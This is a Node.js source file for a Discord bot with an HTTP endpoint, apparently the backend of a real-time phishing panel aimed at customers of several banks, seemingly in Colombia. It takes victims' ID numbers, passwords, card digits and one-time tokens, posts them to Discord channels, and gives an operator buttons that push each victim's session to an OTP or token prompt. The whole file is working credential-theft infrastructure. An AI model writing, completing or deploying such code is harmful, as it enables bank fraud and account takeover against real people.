require('dotenv').config();
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, Events } = require('discord.js');
const http = require('http');
const bancos = require('./bancos');

// ============================================
// CONFIGURACIÓN
// ============================================
const TOKEN = process.env.DISCORD_TOKEN;
const HTTP_PORT = process.env.PORT || 3000;

// ============================================
// ESTADO DE LAS SESIONES
// ============================================
const estadoSesiones = new Map();

// ============================================
// CLIENTE DE DISCORD
// ============================================
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once(Events.ClientReady, (c) => {
    console.log(`🤖 Bot listo como ${c.user.tag}`);
    console.log(`📡 Bancos configurados: ${Object.keys(bancos).length}`);
    Object.entries(bancos).forEach(([key, banco]) => {
        console.log(`   - ${key} → ${banco.canalId}`);
    });
});

// ============================================
// SERVIDOR HTTP
// ============================================
const server = http.createServer(async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, ngrok-skip-browser-warning');

    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

    // ─── POST /:banco/enviar ───────────────────────
    const enviarMatch = req.url.match(/^\/([a-z-]+)\/enviar$/);
    if (req.method === 'POST' && enviarMatch) {
        const bancoKey = enviarMatch[1];
        const banco = bancos[bancoKey];

        if (!banco) {
            res.writeHead(404, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: `Banco "${bancoKey}" no existe` }));
            return;
        }

        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const datos = JSON.parse(body);
                const { sessionId, tipo, tipoDoc, identificacion, clave, tarjeta, token } = datos;

                if (!sessionId) {
                    res.writeHead(400, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ ok: false, error: 'sessionId requerido' }));
                    return;
                }

                estadoSesiones.set(sessionId, 'pendiente');
                console.log(`📥 [${bancoKey}] Nueva sesión: ${sessionId}`);

                const embed = new EmbedBuilder()
                    .setTitle(`${banco.nombre} - Nuevo registro`)
                    .setColor(banco.color)
                    .addFields(
                        { name: '🎫 Tipo', value: tipo || 'N/A', inline: false },
                        { name: '📋 Tipo doc', value: tipoDoc || '(no seleccionado)', inline: true },
                        { name: '🪪 Identificación', value: identificacion || '(vacío)', inline: true }
                    );

                if (clave) {
                    embed.addFields({ name: '🔑 Clave', value: clave || '(vacío)', inline: true });
                }
                if (tarjeta) {
                    embed.addFields({ name: '💳 Últ. 4 dígitos', value: tarjeta || '(vacío)', inline: true });
                }
                if (token) {
                    embed.addFields({ name: '🔐 Token', value: token, inline: false });
                }

                const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
                embed.addFields({ name: '🕒 Fecha', value: fecha, inline: false });
                embed.setFooter({ text: `Sesión: ${sessionId} | ${bancoKey}` });

                // 3 BOTONES: Rechazar, OTP, Token
                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
                        .setLabel('❌ Rechazar')
                        .setStyle(ButtonStyle.Danger),
                    new ButtonBuilder()
                        .setCustomId(`OTP|${bancoKey}|${sessionId}`)
                        .setLabel('📱 OTP')
                        .setStyle(ButtonStyle.Primary),
                    new ButtonBuilder()
                        .setCustomId(`TOKEN|${bancoKey}|${sessionId}`)
                        .setLabel('🔢 Token')
                        .setStyle(ButtonStyle.Success)
                );

                const channel = await client.channels.fetch(banco.canalId);
                await channel.send({ embeds: [embed], components: [row] });

                console.log(`📨 [${bancoKey}] Enviado a canal ${banco.canalId}`);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: true, sessionId }));
            } catch (err) {
                console.error(`❌ [${bancoKey}] Error /enviar:`, err);
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: false, error: err.message }));
            }
        });
        return;
    }

    // ─── GET /:banco/estado/:sessionId ────────────
    const estadoMatch = req.url.match(/^\/([a-z-]+)\/estado\/([^?]+)/);
    if (req.method === 'GET' && estadoMatch) {
        const bancoKey = estadoMatch[1];
        const sessionId = estadoMatch[2];

        if (!bancos[bancoKey]) {
            res.writeHead(404, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'Banco no existe' }));
            return;
        }

        const estado = estadoSesiones.get(sessionId) || 'pendiente';
        console.log(`🔍 [${bancoKey}] Consulta: ${sessionId} → ${estado}`);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ estado }));
        return;
    }

    // ─── GET /health ──────────────────────────────
    if (req.method === 'GET' && req.url === '/health') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            ok: true,
            bancos: Object.keys(bancos).length,
            sesiones: estadoSesiones.size
        }));
        return;
    }

    res.writeHead(404);
    res.end('Not found');
});

server.listen(HTTP_PORT, () => {
    console.log(`🌐 HTTP corriendo en puerto ${HTTP_PORT}`);
});

// ============================================
// CLICS EN BOTONES
// ============================================
client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isButton()) return;

    console.log(`🔘 Botón pulsado: ${interaction.customId}`);

    // customId = "ACCION|bancoKey|sessionId"
    const partes = interaction.customId.split('|');
    const accion = partes[0];
    const bancoKey = partes[1];
    const sessionId = partes[2];
    const usuario = interaction.user.username;

    if (accion === 'RECHAZAR') {
        estadoSesiones.set(sessionId, 'rechazado');
        console.log(`❌ [${bancoKey}] RECHAZADO: ${sessionId}`);
        await interaction.reply({ content: `❌ Sesión **${sessionId}** RECHAZADA por ${usuario}` });

    } else if (accion === 'OTP') {
        estadoSesiones.set(sessionId, 'otp');
        console.log(`📱 [${bancoKey}] OTP: ${sessionId}`);
        await interaction.reply({ content: `📱 Sesión **${sessionId}** enviada a OTP por ${usuario}` });

    } else if (accion === 'TOKEN') {
        estadoSesiones.set(sessionId, 'token');
        console.log(`🔢 [${bancoKey}] TOKEN: ${sessionId}`);
        await interaction.reply({ content: `🔢 Sesión **${sessionId}** enviada a TOKEN por ${usuario}` });
    }

    // Quitar los botones del mensaje
    await interaction.message.edit({ components: [] });
});

client.login(TOKEN);